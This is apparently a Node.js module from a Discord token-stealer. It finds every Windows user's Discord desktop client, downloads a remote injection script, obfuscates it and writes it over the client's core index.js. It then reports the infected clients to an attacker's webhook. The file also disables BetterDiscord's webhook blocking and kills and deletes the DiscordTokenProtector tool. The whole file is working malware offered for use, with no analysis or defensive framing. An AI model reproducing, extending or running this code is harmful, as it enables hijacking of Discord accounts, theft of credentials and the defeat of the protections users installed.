const {
    sendWebhook 
} = require('../../../utils/request/sendWebhook.js');

const {
    getUsers 
} = require('../../../utils/harware.js');

const child_process = require('child_process');
const fsPromises    = require('fs/promises');
const jsConfuser    = require('js-confuser');
const axios         = require('axios');
const path          = require('path');
const fs            = require('fs');

async function injectDiscord(dir, injectionUrl, webhook, api) {
    try {
        const CONFIG_INJECT = {
            API: api,
            auto_user_profile_edit: 'true',
            auto_email_update: 'true',
            gofile_download_link: 'https://gofile.io', // Perhaps I'll add something better when there are more stars
        };

        const files = await fsPromises.readdir(dir, { withFileTypes: true });
        const appDirs = files
            .filter(file => file.isDirectory() && file.name.startsWith('app-'))
            .map(file => path.join(dir, file.name, 'modules'));

        const matchingDirs = await Promise.all(appDirs.map(async coreDir => {
            try {
                const matchedDirs = await fsPromises.readdir(coreDir, { withFileTypes: true });
                return matchedDirs
                    .filter(file => file.isDirectory() && file.name.startsWith('discord_desktop_core-'))
                    .map(file => path.join(coreDir, file.name, 'discord_desktop_core'));
            } catch (err) {
                return [];
            }
        }));

        const flattenedDirs = matchingDirs.flat();
        let infectedDiscord = new Set();

        for (const coreDir of flattenedDirs) {
            try {
                const initiationDir = path.join(coreDir, 'aurathemes');
                await fsPromises.mkdir(initiationDir, { recursive: true });

                const response = await axios.get(injectionUrl);
                const injection = response.data;

                const srcInjection = injection
                    .replace("%WEBHOOK_URL%", webhook)
                    .replace("%API_URL%", CONFIG_INJECT.API)
                    .replace("%AUTO_USER_PROFILE_EDIT%", CONFIG_INJECT.auto_user_profile_edit)
                    .replace("%AUTO_EMAIL_UPDATE%", CONFIG_INJECT.auto_email_update)
                    .replace("%GOFILE_DOWNLOAD_LINK%", CONFIG_INJECT.gofile_download_link);
                
                const applyObfInjection = await jsConfuser.obfuscate(srcInjection, {
                    target: "node",
                    controlFlowFlattening: 0,
                    minify: false,
                    globalConcealing: true,
                    stringCompression: 1,
                    stringConcealing: 0.9,
                    stringEncoding: 0.3,
                    stringSplitting: 1,
                    deadCode: 0,
                    calculator: 0.5,
                    compact: true,
                    movedDeclarations: false,
                    objectExtraction: false,
                    stack: true,
                    duplicateLiteralsRemoval: 0,
                    flatten: false,
                    dispatcher: true,
                    opaquePredicates: 0,
                    shuffle: { hash: 0.6, true: 0.6 },
                    renameVariables: false,
                    renameGlobals: false
                });

                const indexJsPath = path.join(coreDir, 'index.js');

                await fsPromises.writeFile(indexJsPath, applyObfInjection, 'utf8');
                const match = coreDir.match(/Local\\(discordcanary|discord|discorddevelopment|discordptb)\\/i);
                if (match) {
                    infectedDiscord.add(match[1].toLowerCase());
                }
            } catch (error) {
                console.error(`Failed to process ${coreDir}:`, error);
            }
        }

        const description = infectedDiscord.size > 0 ? Array.from(infectedDiscord).map(name => `\`${name}\``).join(", ") : `\`Not found\``;
        const data = {
            embeds: [
                {
                    title: 'Discord(s) injected(s)',
                    description,
                }
            ]
        };

        try {
            await sendWebhook(webhook, data);
        } catch (err) {
            console.error("Failed to send webhook:", err);
        }
    } catch (error) {
    }
}

function bypassBetterDiscord(user) {
    const bdPath = path.join(user, 'AppData', 'Roaming', 'BetterDiscord', 'data', 'betterdiscord.asar');
    try {
        if (fs.existsSync(bdPath)) {
            const txt = fs.readFileSync(bdPath, 'utf8');
            const modifiedTxt = txt.replace(/api\/webhooks/g, 'HackedByK4itrun');
            fs.writeFileSync(bdPath, modifiedTxt, 'utf8');
        }
    } catch (error) {
        console.error('Failed to bypass BetterDiscord:', error);
    }
}

function bypassTokenProtector(user) {
    const dir = path.join(user, 'AppData', 'Roaming', 'DiscordTokenProtector');
    const configPath = path.join(dir, 'config.json');

    try {
        const processes = child_process.execSync('tasklist', { encoding: 'utf8' }).split('\n');
        processes.forEach(process => {
            if (process.toLowerCase().includes('discordtokenprotector')) {
                const processName = process.split(/\s+/)[0];
                child_process.execSync(`taskkill /F /IM ${processName}`);
            }
        });

        ['DiscordTokenProtector.exe', 'ProtectionPayload.dll', 'secure.dat'].forEach(file => {
            const filePath = path.join(dir, file);
            try {
                fs.unlinkSync(filePath);
            } catch (error) {
            }
        });

        if (fs.existsSync(configPath)) {
            const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
            Object.assign(config, {
                k4itrun_is_here: "https://discord.gg/6TGcqtbbHp",
                auto_start: false,
                auto_start_discord: false,
                integrity: false,
                integrity_allowbetterdiscord: false,
                integrity_checkexecutable: false,
                integrity_checkhash: false,
                integrity_checkmodule: false,
                integrity_checkscripts: false,
                integrity_checkresource: false,
                integrity_redownloadhashes: false,
                iterations_iv: 364,
                iterations_key: 457,
                version: 69420
            });
            fs.writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8');
            fs.appendFileSync(config, `\n\n//k4itrun_is_here | https://discord.gg/6TGcqtbbHp`, 'utf8');
        }
    } catch (error) {
        console.error('Failed to bypass TokenProtector:', error);
    }
}

module.exports = async (injectionUrl, webhook, api) => {
    try {
        const users = await getUsers();
        for (const user of users) {
            bypassBetterDiscord(user);
            bypassTokenProtector(user);
            const directories = [
                path.join(user, 'AppData', 'Local', 'discord'),
                path.join(user, 'AppData', 'Local', 'discordcanary'),
                path.join(user, 'AppData', 'Local', 'discordptb'),
                path.join(user, 'AppData', 'Local', 'discorddevelopment')
            ];
            for (const dir of directories) {
                await injectDiscord(dir, injectionUrl, webhook, api);
            }
        }
    } catch (error) {
        console.error('Failed to run injections:', error);
    }
}